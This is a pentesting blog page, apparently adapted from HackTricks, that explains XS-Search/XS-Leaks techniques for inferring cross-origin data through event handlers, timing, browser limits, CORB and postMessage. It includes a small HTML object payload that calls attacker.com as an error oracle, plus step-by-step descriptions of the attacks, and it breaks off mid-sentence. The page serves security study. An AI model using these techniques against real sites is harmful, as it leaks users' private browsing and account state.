<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> XS-Search/XS-Leaks | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-xs-search/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">XS-Search/XS-Leaks</h1> <p class="post-description"></p> </header> <article> <h1 id="xs-searchxs-leaks">XS-Search/XS-Leaks</h1> <h2 id="basic-information">Basic Information</h2> <p>XS-Search is a method used for <strong>extracting cross-origin information</strong> by leveraging <strong>side channel vulnerabilities</strong>.</p> <p>Key components involved in this attack include:</p> <ul> <li> <strong>Vulnerable Web</strong>: The target website from which information is intended to be extracted.</li> <li> <strong>Attacker’s Web</strong>: The malicious website created by the attacker, which the victim visits, hosting the exploit.</li> <li> <strong>Inclusion Method</strong>: The technique employed to incorporate the Vulnerable Web into the Attacker’s Web (e.g., window.open, iframe, fetch, HTML tag with href, etc.).</li> <li> <strong>Leak Technique</strong>: Techniques used to discern differences in the state of the Vulnerable Web based on information gathered through the inclusion method.</li> <li> <strong>States</strong>: The two potential conditions of the Vulnerable Web, which the attacker aims to distinguish.</li> <li> <strong>Detectable Differences</strong>: Observable variations that the attacker relies on to infer the state of the Vulnerable Web.</li> </ul> <h3 id="detectable-differences">Detectable Differences</h3> <p>Several aspects can be analyzed to differentiate the states of the Vulnerable Web:</p> <ul> <li> <strong>Status Code</strong>: Distinguishing between <strong>various HTTP response status codes</strong> cross-origin, like server errors, client errors, or authentication errors.</li> <li> <strong>API Usage</strong>: Identifying <strong>usage of Web APIs</strong> across pages, revealing whether a cross-origin page employs a specific JavaScript Web API.</li> <li> <strong>Redirects</strong>: Detecting navigations to different pages, not just HTTP redirects but also those triggered by JavaScript or HTML.</li> <li> <strong>Page Content</strong>: Observing <strong>variations in the HTTP response body</strong> or in page sub-resources, such as the <strong>number of embedded frames</strong> or size disparities in images.</li> <li> <strong>HTTP Header</strong>: Noting the presence or possibly the value of a <strong>specific HTTP response header</strong>, including headers like X-Frame-Options, Content-Disposition, and Cross-Origin-Resource-Policy.</li> <li> <strong>Timing</strong>: Noticing consistent time disparities between the two states.</li> </ul> <h3 id="inclusion-methods">Inclusion Methods</h3> <ul> <li> <strong>HTML Elements</strong>: HTML offers various elements for <strong>cross-origin resource inclusion</strong>, like stylesheets, images, or scripts, compelling the browser to request a non-HTML resource. A compilation of potential HTML elements for this purpose can be found at <a href="https://github.com/cure53/HTTPLeaks" rel="external nofollow noopener" target="_blank">https://github.com/cure53/HTTPLeaks</a>.</li> <li> <strong>Frames</strong>: Elements such as <strong>iframe</strong>, <strong>object</strong>, and <strong>embed</strong> can embed HTML resources directly into the attacker’s page. If the page <strong>lacks framing protection</strong>, JavaScript can access the framed resource’s window object via the contentWindow property.</li> <li> <strong>Pop-ups</strong>: The <strong><code class="language-plaintext highlighter-rouge">window.open</code></strong> method opens a resource in a new tab or window, providing a <strong>window handle</strong> for JavaScript to interact with methods and properties following the SOP. Pop-ups, often used in single sign-on, circumvent framing and cookie restrictions of a target resource. However, modern browsers restrict pop-up creation to certain user actions.</li> <li> <strong>JavaScript Requests</strong>: JavaScript permits direct requests to target resources using <strong>XMLHttpRequests</strong> or the <strong>Fetch API</strong>. These methods offer precise control over the request, like opting to follow HTTP redirects.</li> </ul> <h3 id="leak-techniques">Leak Techniques</h3> <ul> <li> <strong>Event Handler</strong>: A classical leak technique in XS-Leaks, where event handlers like <strong>onload</strong> and <strong>onerror</strong> provide insights about resource loading success or failure.</li> <li> <strong>Error Messages</strong>: JavaScript exceptions or special error pages can provide leak information either directly from the error message or by differentiating between its presence and absence.</li> <li> <strong>Global Limits</strong>: Physical limitations of a browser, like memory capacity or other enforced browser limits, can signal when a threshold is reached, serving as a leak technique.</li> <li> <strong>Global State</strong>: Detectable interactions with browsers’ <strong>global states</strong> (e.g., the History interface) can be exploited. For instance, the <strong>number of entries</strong> in a browser’s history can offer clues about cross-origin pages.</li> <li> <strong>Performance API</strong>: This API provides <strong>performance details of the current page</strong>, including network timing for the document and loaded resources, enabling inferences about requested resources.</li> <li> <strong>Readable Attributes</strong>: Some HTML attributes are <strong>readable cross-origin</strong> and can be used as a leak technique. For instance, the <code class="language-plaintext highlighter-rouge">window.frame.length</code> property allows JavaScript to count the frames included in a webpage cross-origin.</li> </ul> <h2 id="xsinator-tool--paper">XSinator Tool &amp; Paper</h2> <p>XSinator is an automatic tool to <strong>check browsers against several know XS-Leaks</strong> explained in its paper: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank"><strong>https://xsinator.com/paper.pdf</strong></a></p> <p>You can <strong>access the tool in</strong> <a href="https://xsinator.com/" rel="external nofollow noopener" target="_blank"><strong>https://xsinator.com/</strong></a></p> <blockquote> <p>[!WARNING] &gt; <strong>Excluded XS-Leaks</strong>: We had to exclude XS-Leaks that rely on <strong>service workers</strong> as they would interfere with other leaks in XSinator. Furthermore, we chose to <strong>exclude XS-Leaks that rely on misconfiguration and bugs in a specific web application</strong>. For example, CrossOrigin Resource Sharing (CORS) misconfigurations, postMessage leakage or Cross-Site Scripting. Additionally, we excluded timebased XS-Leaks since they often suffer from being slow, noisy and inaccurate.</p> </blockquote> <h2 id="timing-based-techniques"><strong>Timing Based techniques</strong></h2> <p>Some of the following techniques are going to use timing to as part of the process to detect differences in the possible states of the web pages. There are different ways to measure time in a web browser.</p> <p><strong>Clocks</strong>: The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Performance/now" rel="external nofollow noopener" target="_blank">performance.now()</a> API allows developers to get high-resolution timing measurements.<br> There are a considerable number of APIs attackers can abuse to create implicit clocks: <a href="https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API" rel="external nofollow noopener" target="_blank">Broadcast Channel API</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel" rel="external nofollow noopener" target="_blank">Message Channel API</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame" rel="external nofollow noopener" target="_blank">requestAnimationFrame</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout" rel="external nofollow noopener" target="_blank">setTimeout</a>, CSS animations, and others.<br> For more info: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/clocks/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/clocks</a>.</p> <h2 id="event-handler-techniques">Event Handler Techniques</h2> <h3 id="onloadonerror">Onload/Onerror</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, HTML Elements</li> <li> <strong>Detectable Difference</strong>: Status Code</li> <li> <strong>More info</strong>: <a href="https://www.usenix.org/conference/usenixsecurity19/presentation/staicu" rel="external nofollow noopener" target="_blank">https://www.usenix.org/conference/usenixsecurity19/presentation/staicu</a>, <a href="https://xsleaks.dev/docs/attacks/error-events/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/error-events/</a> </li> <li> <strong>Summary</strong>: if trying to load a resource onerror/onload events are triggered with the resource is loaded successfully/unsuccessfully it’s possible to figure out the status code.</li> <li> <strong>Code example</strong>: <a href="https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)</a> </li> </ul> <p>xs-search/cookie-bomb-+-onerror-xs-leak.md</p> <p>The code example try lo <strong>load scripts objects from JS</strong>, but <strong>other tags</strong> such as objects, stylesheets, images, audios could be also used. Moreover, it’s also possible to inject the <strong>tag directly</strong> and declare the <code class="language-plaintext highlighter-rouge">onload</code> and <code class="language-plaintext highlighter-rouge">onerror</code> events inside the tag (instead of injecting it from JS).</p> <p>There is also a script-less version of this attack:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;object</span> <span class="na">data=</span><span class="s">"//example.com/404"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;object</span> <span class="na">data=</span><span class="s">"//attacker.com/?error"</span><span class="nt">&gt;&lt;/object&gt;</span>
<span class="nt">&lt;/object&gt;</span>
</code></pre></div></div> <p>In this case if <code class="language-plaintext highlighter-rouge">example.com/404</code> is not found <code class="language-plaintext highlighter-rouge">attacker.com/?error</code> will be loaded.</p> <h3 id="onload-timing">Onload Timing</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events</a> </li> <li> <strong>Summary:</strong> The <a href="https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow" rel="external nofollow noopener" target="_blank"><strong>performance.now()</strong></a> <strong>API</strong> can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as <a href="https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming" rel="external nofollow noopener" target="_blank"><strong>PerformanceLongTaskTiming API</strong></a> which can identify tasks running for more than 50ms.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events</a> another example in:</li> </ul> <p>xs-search/performance.now-example.md</p> <h4 id="onload-timing--forced-heavy-task">Onload Timing + Forced Heavy Task</h4> <p>This technique is just like the previous one, but the <strong>attacker</strong> will also <strong>force</strong> some action to take a <strong>relevant amount time</strong> when the <strong>answer is positive or negative</strong> and measure that time.</p> <p>xs-search/performance.now-+-force-heavy-task.md</p> <h3 id="unloadbeforeunload-timing">unload/beforeunload Timing</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events</a> </li> <li> <strong>Summary:</strong> The <a href="https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers" rel="external nofollow noopener" target="_blank">SharedArrayBuffer clock</a> can be used to measure how much time it takes to perform a request. Other clocks could be used.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events</a> </li> </ul> <p>The time taken to fetch a resource can be measured by utilizing the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">unload</code></a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">beforeunload</code></a> events. The <strong><code class="language-plaintext highlighter-rouge">beforeunload</code></strong> event is fired when the browser is about to navigate to a new page, while the <strong><code class="language-plaintext highlighter-rouge">unload</code></strong> event occurs when the navigation is actually taking place. The time difference between these two events can be calculated to determine the <strong>duration the browser spent fetching the resource</strong>.</p> <h3 id="sandboxed-frame-timing--onload-">Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks</a> </li> <li> <strong>Summary:</strong> The <a href="https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow" rel="external nofollow noopener" target="_blank">performance.now()</a> API can be used to measure how much time it takes to perform a request. Other clocks could be used.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks</a> </li> </ul> <p>It has been observed that in the absence of <a href="https://xsleaks.dev/docs/defenses/opt-in/xfo/" rel="external nofollow noopener" target="_blank">Framing Protections</a>, the time required for a page and its subresources to load over the network can be measured by an attacker. This measurement is typically possible because the <code class="language-plaintext highlighter-rouge">onload</code> handler of an iframe is triggered only after the completion of resource loading and JavaScript execution. To bypass the variability introduced by script execution, an attacker might employ the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">sandbox</code></a> attribute within the <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code>. The inclusion of this attribute restricts numerous functionalities, notably the execution of JavaScript, thereby facilitating a measurement that is predominantly influenced by network performance.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Example of an iframe with the sandbox attribute</span>
<span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">example.html</span><span class="dl">"</span> <span class="nx">sandbox</span><span class="o">&gt;&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
</span></code></pre></div></div> <h3 id="id--error--onload">#ID + error + onload</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>:</li> <li> <strong>Summary</strong>: If you can make the page error when the correct content is accessed and make it load correctly when any content is accessed, then you can make a loop to extract all the information without measuring the time.</li> <li> <strong>Code Example</strong>:</li> </ul> <p>Suppose that you can <strong>insert</strong> the <strong>page</strong> that has the <strong>secret</strong> content <strong>inside an Iframe</strong>.</p> <p>You can <strong>make the victim search</strong> for the file that contains “<em><strong>flag</strong></em>” using an <strong>Iframe</strong> (exploiting a CSRF for example). Inside the Iframe you know that the <em><strong>onload event</strong></em> will be <strong>executed always at least once</strong>. Then, you can <strong>change</strong> the <strong>URL</strong> of the <strong>iframe</strong> but changing only the <strong>content</strong> of the <strong>hash</strong> inside the URL.</p> <p>For example:</p> <ol> <li> <strong>URL1</strong>: www.attacker.com/xssearch#try1</li> <li> <strong>URL2</strong>: www.attacker.com/xssearch#try2</li> </ol> <p>If the first URL was <strong>successfully loaded</strong>, then, when <strong>changing</strong> the <strong>hash</strong> part of the URL the <strong>onload</strong> event <strong>won’t be triggered</strong> again. But <strong>if</strong> the page had some kind of <strong>error</strong> when <strong>loading</strong>, then, the <strong>onload</strong> event will be <strong>triggered again</strong>.</p> <p>Then, you can <strong>distinguish between</strong> a <strong>correctly</strong> loaded page or page that has an <strong>error</strong> when is accessed.</p> <h3 id="javascript-execution">Javascript Execution</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>:</li> <li> <strong>Summary:</strong> If the <strong>page</strong> is <strong>returning</strong> the <strong>sensitive</strong> content, <strong>or</strong> a <strong>content</strong> that can be <strong>controlled</strong> by the user. The user could set <strong>valid JS code in the negative case</strong>, an <strong>load</strong> each try inside <strong><code class="language-plaintext highlighter-rouge">&lt;script&gt;</code></strong> tags, so in <strong>negative</strong> cases attackers <strong>code</strong> is <strong>executed,</strong> and in <strong>affirmative</strong> cases <strong>nothing</strong> will be executed.</li> <li><strong>Code Example:</strong></li> </ul> <p>xs-search/javascript-execution-xs-leak.md</p> <h3 id="corb---onerror">CORB - Onerror</h3> <ul> <li> <strong>Inclusion Methods</strong>: HTML Elements</li> <li> <strong>Detectable Difference</strong>: Status Code &amp; Headers</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/browser-features/corb/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/browser-features/corb/</a> </li> <li> <strong>Summary</strong>: <strong>Cross-Origin Read Blocking (CORB)</strong> is a security measure that prevents web pages from loading certain sensitive cross-origin resources to protect against attacks like <strong>Spectre</strong>. However, attackers can exploit its protective behavior. When a response subject to <strong>CORB</strong> returns a <em><strong>CORB protected</strong></em> <code class="language-plaintext highlighter-rouge">Content-Type</code> with <code class="language-plaintext highlighter-rouge">nosniff</code> and a <code class="language-plaintext highlighter-rouge">2xx</code> status code, <strong>CORB</strong> strips the response’s body and headers. Attackers observing this can infer the combination of the <strong>status code</strong> (indicating success or error) and the <code class="language-plaintext highlighter-rouge">Content-Type</code> (denoting whether it’s protected by <strong>CORB</strong>), leading to potential information leakage.</li> <li><strong>Code Example:</strong></li> </ul> <p>Check the more information link for more information about the attack.</p> <h3 id="onblur">onblur</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames</li> <li> <strong>Detectable Difference</strong>: Page Content</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/id-attribute/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/id-attribute/</a>, <a href="https://xsleaks.dev/docs/attacks/experiments/portals/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/experiments/portals/</a> </li> <li> <strong>Summary</strong>: Leak sensitive data from the id or name attribute.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet</a> </li> </ul> <p>It’s possible to <strong>load a page</strong> inside an <strong>iframe</strong> and use the <strong><code class="language-plaintext highlighter-rouge">#id_value</code></strong> to make the page <strong>focus on the element</strong> of the iframe with indicated if, then if an <strong><code class="language-plaintext highlighter-rouge">onblur</code></strong> signal is triggered, the ID element exists.<br> You can perform the same attack with <strong><code class="language-plaintext highlighter-rouge">portal</code></strong> tags.</p> <h3 id="postmessage-broadcasts-">postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: API Usage</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/postmessage-broadcasts/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/postmessage-broadcasts/</a> </li> <li> <strong>Summary</strong>: Gather sensitive information from a postMessage or use the presence of postMessages as an oracle to know the status of the user in the page</li> <li> <strong>Code Example</strong>: <code class="language-plaintext highlighter-rouge">Any code listening for all postMessages.</code> </li> </ul> <p>Applications frequently utilize <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="external nofollow noopener" target="_blank"><code class="language-plaintext highlighter-rouge">postMessage</code> broadcasts</a> to communicate across different origins. However, this method can inadvertently expose <strong>sensitive information</strong> if the <code class="language-plaintext highlighter-rouge">targetOrigin</code> parameter is not properly specified, allowing any window to receive the messages. Furthermore, the mere act of receiving a message can act as an <strong>oracle</strong>; for instance, certain messages might only be sent to users who are logged in. Therefore, the presence or absence of these messages can reveal information about the user’s state or identity, such as whether they are authenticated or not.</p> <h2 id="global-limits-techniques">Global Limits Techniques</h2> <h3 id="websocket-api">WebSocket API</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: API Usage</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.1)</li> <li> <strong>Summary</strong>: Exhausting the WebSocket connection limit leaks the number of WebSocket connections of a cross-origin page.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)</a>, <a href="https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)</a> </li> </ul> <p>It is possible to identify if, and how many, <strong>WebSocket connections a target page uses</strong>. It allows an attacker to detect application states and leak information tied to the number of WebSocket connections.</p> <p>If one <strong>origin</strong> uses the <strong>maximum amount of WebSocket</strong> connection objects, regardless of their connections state, the creation of <strong>new objects will result in JavaScript exceptions</strong>. To execute this attack, the attacker website opens the target website in a pop-up or iframe and then, after the target web has been loaded, attempts to create the maximum number of WebSockets connections possible. The <strong>number of thrown exceptions</strong> is the <strong>number of WebSocket connections used by the target website</strong> window.</p> <h3 id="payment-api">Payment API</h3> <ul> <li> <strong>Inclusion Methods</strong>: Frames, Pop-ups</li> <li> <strong>Detectable Difference</strong>: API Usage</li> <li> <strong>More info</strong>: <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> (5.1)</li> <li> <strong>Summary</strong>: Detect Payment Request because only one can be active at a time.</li> <li> <strong>Code Example</strong>: <a href="https://xsinator.com/testing.html#Payment%20API%20Leak" rel="external nofollow noopener" target="_blank">https://xsinator.com/testing.html#Payment%20API%20Leak</a> </li> </ul> <p>This XS-Leak enables an attacker to <strong>detect when a cross-origin page initiates a payment request</strong>.</p> <p>Because <strong>only one request payment can be active</strong> at the same time, if the target website is using the Payment Request API, any f<strong>urther attempts to show use this API will fail</strong>, and cause a <strong>JavaScript exception</strong>. The attacker can exploit this by <strong>periodically attempting to show the Payment API UI</strong>. If one attempt causes an exception, the target website is currently using it. The attacker can hide these periodical attempts by immediately closing the UI after creation.</p> <h3 id="timing-the-event-loop-">Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>:</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop</a> </li> <li> <strong>Summary:</strong> Measure execution time of a web abusing the single-threaded JS event loop.</li> <li> <strong>Code Example</strong>:</li> </ul> <p>xs-search/event-loop-blocking-+-lazy-images.md</p> <p>JavaScript operates on a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop" rel="external nofollow noopener" target="_blank">single-threaded event loop</a> concurrency model, signifying that <strong>it can only execute one task at a time</strong>. This characteristic can be exploited to gauge <strong>how long code from a different origin takes to execute</strong>. An attacker can measure the execution time of their own code in the event loop by continuously dispatching events with fixed properties. These events will be processed when the event pool is empty. If other origins are also dispatching events to the same pool, an <strong>attacker can infer the time it takes for these external events to execute by observing delays in the execution of their own tasks</strong>. This method of monitoring the event loop for delays can reveal the execution time of code from different origins, potentially exposing sensitive information.</p> <blockquote> <p>[!WARNING] In an execution timing it’s possible to <strong>eliminate</strong> <strong>network factors</strong> to obtain <strong>more precise measurements</strong>. For example, by loading the resources used by the page before loading it.</p> </blockquote> <h3 id="busy-event-loop-">Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a> </h3> <ul> <li> <strong>Inclusion Methods</strong>:</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop</a> </li> <li> <strong>Summary:</strong> One method to measure the execution time of a web operation involves intentionally blocking the event loop of a thread and then timing <strong>how long it takes for the event loop to become available again</strong>. By inserting a blocking operation (such as a long computation or a synchronous API call) into the event loop, and monitoring the time it takes for subsequent code to begin execution, one can infer the duration of the tasks that were executing in the event loop during the blocking period. This technique leverages the single-threaded nature of JavaScript’s event loop, where tasks are executed sequentially, and can provide insights into the performance or behavior of other operations sharing the same thread.</li> <li> <strong>Code Example</strong>:</li> </ul> <p>A significant advantage of the technique of measuring execution time by locking the event loop is its potential to circumvent <strong>Site Isolation</strong>. <strong>Site Isolation</strong> is a security feature that separates different websites into separate processes, aiming to prevent malicious sites from directly accessing sensitive data from other sites. However, by influencing the execution timing of another origin through the shared event loop, an attacker can indirectly extract information about that origin’s activities. This method does not rely on direct access to the other origin’s data but rather observes the impact of that origin’s activities on the shared event loop, thus evading the protective barriers established by <strong>Site Isolation</strong>.</p> <blockquote> <p>[!WARNING] In an execution timing it’s possible to <strong>eliminate</strong> <strong>network factors</strong> to obtain <strong>more precise measurements</strong>. For example, by loading the resources used by the page before loading it.</p> </blockquote> <h3 id="connection-pool">Connection Pool</h3> <ul> <li> <strong>Inclusion Methods</strong>: JavaScript Requests</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</a> </li> <li> <strong>Summary:</strong> An attacker could lock all the sockets except 1, load the target web and at the same time load another page, the time until the last page is starting to load is the time the target page took to load.</li> <li> <strong>Code Example</strong>:</li> </ul> <p>xs-search/connection-pool-example.md</p> <p>Browsers utilize sockets for server communication, but due to the limited resources of the operating system and hardware, <strong>browsers are compelled to impose a limit</strong> on the number of concurrent sockets. Attackers can exploit this limitation through the following steps:</p> <ol> <li>Ascertain the browser’s socket limit, for instance, 256 global sockets.</li> <li>Occupy 255 sockets for an extended duration by initiating 255 requests to various hosts, designed to keep the connections open without completing.</li> <li>Employ the 256th socket to send a request to the target page.</li> <li>Attempt a 257th request to a different host. Given that all sockets are in use (as per steps 2 and 3), this request will be queued until a socket becomes available. The delay before this request proceeds provides the attacker with timing information about the network activity related to the 256th socket (the target 